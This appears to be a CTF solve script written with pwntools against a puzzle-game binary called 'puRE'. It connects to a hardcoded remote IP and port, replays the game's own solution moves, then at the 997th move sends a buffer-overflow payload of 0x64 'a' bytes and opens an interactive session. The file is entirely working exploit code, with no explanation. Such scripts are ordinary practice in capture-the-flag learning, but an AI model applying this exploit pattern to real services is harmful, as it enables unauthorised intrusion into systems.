#!/usr/bin/python3

from pwn import *


exe = ELF('./puRE', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b * printf

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('67.223.119.69',5025)
else:
    p = process([exe.path])


sl(b'test')
sl(b'solution')
p.recvuntil("Solution (36 moves):\r\n")
solvetest = p.recvline().split()
info("here")
print(solvetest)
for move in solvetest:
    sl(move)
    


sl(b'challenge')
sl(b'solution')
p.recvuntil("Solution (1836 moves):\r\n")
solvetest = p.recvuntil(">>",drop=True).split()
info("here")
print(solvetest)
#GDB()
count = 0
for move in solvetest:
    sl(move)
    p.recvuntil(">>")
    count = count +1
    if count == 997:
       sl(b"a"*0x64+b'0') 




p.interactive()




